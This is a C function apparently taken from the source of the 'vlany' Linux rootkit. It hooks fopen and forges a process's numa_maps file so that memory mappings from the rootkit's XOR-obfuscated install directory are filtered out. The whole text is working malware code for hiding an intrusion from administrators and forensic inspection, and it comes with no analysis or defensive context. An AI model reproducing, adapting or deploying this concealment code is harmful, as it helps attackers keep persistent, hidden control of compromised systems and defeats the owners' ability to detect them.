FILE *forge_numa_maps(const char *path)
{
    #ifdef DEBUG
        printf("[vlany] forge_mem_maps() called\n");
    #endif

    HOOK(old_fopen, CFOPEN);

    char buf[PATH_MAX];
    FILE *o = tmpfile(), *pnt = old_fopen(path, "r");

    if(pnt == NULL) { errno = ENOENT; return NULL; }

    char *install_dir = strdup(INSTALL_DIR); xor(install_dir);
    while(fgets(buf, sizeof(buf), pnt) != NULL)
    {
        char addr[128], type[64], location[PATH_MAX];
        sscanf(buf, "%s %s %s", addr, type, location);
        if(!strncmp(location, "file=", strlen("file="))) if(!strstr(location, install_dir)) fputs(buf, o);
    }
    CLEAN(install_dir);

    fclose(pnt); fseek(o, 0, SEEK_SET);
    return o;
}
